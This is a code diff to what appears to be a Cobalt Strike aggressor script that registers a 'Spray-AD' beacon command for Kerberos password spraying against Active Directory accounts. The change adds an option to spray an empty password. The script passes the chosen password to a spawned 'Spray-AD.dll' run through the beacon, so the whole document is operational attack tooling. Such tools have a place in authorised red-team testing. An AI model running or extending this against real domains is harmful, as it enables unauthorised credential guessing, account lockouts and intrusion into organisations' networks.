@@ -5,7 +5,9 @@
 #register help
 beacon_command_register("Spray-AD", "Perform a Kerberos password spraying attack against Active Directory.",
 	"Test all enabled Active Directory useraccounts for valid passwords.\n\n" .
-	"Synopsis: Spray-AD [password]\n\n");
+	"Synopsis: Spray-AD [options] [password]\n\n" .
+	"--empty-password\n\n" .
+	"\tSpecify this flag to use an empty password to spray\n\n");
 
 alias Spray-AD {
 	$bid = $1;
@@ -16,11 +18,14 @@ alias Spray-AD {
 	$object = @args[0];
 
     if ($object eq "") {
-		berror($bid, "Please specify a password to test.");
+		berror($bid, "Please specify a password to test or use '--empty-password'.");
 		return;
 	}
-    else{
-        blog($bid, "Let's start spraying useraccounts with password: " . $object . "\n");
-        bdllspawn($bid, script_resource("Spray-AD.dll"), $object, "Spray-AD", 5000, false);
+
+    if ($object eq "--empty-password") {
+		$object = "";
 	}
+
+    blog($bid, "Let's start spraying useraccounts with password: " . $object . "\n");
+    bdllspawn($bid, script_resource("Spray-AD.dll"), $object, "Spray-AD", 5000, false);
 }
